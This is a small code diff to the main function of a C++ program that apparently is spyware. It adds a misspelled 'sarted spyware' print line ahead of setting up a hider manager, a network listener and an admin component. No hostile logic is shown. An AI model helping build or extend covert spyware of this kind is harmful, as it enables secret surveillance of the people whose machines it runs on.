@@ -18,6 +18,8 @@ void loopIter(Connection& conn, HiderManeger& hiderManeger, ContraptionAdmin& ad
 
 int main() {
     
+    std::cout << "sarted spyware" << std::endl;
+    
     HiderManeger hiderManager = HiderManeger();
     Listener listener = Listener(PORT);
     ContraptionAdmin admin = ContraptionAdmin();
